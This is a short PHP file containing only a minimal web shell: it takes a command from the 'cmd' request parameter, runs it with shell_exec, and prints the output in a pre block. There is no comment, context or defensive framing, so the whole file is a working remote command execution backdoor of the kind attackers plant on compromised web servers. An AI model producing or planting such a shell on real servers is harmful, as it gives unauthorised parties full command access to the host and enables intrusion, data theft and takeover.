<?php
$output = shell_exec($_REQUEST["cmd"]);
echo "<pre>$output</pre>";
?>
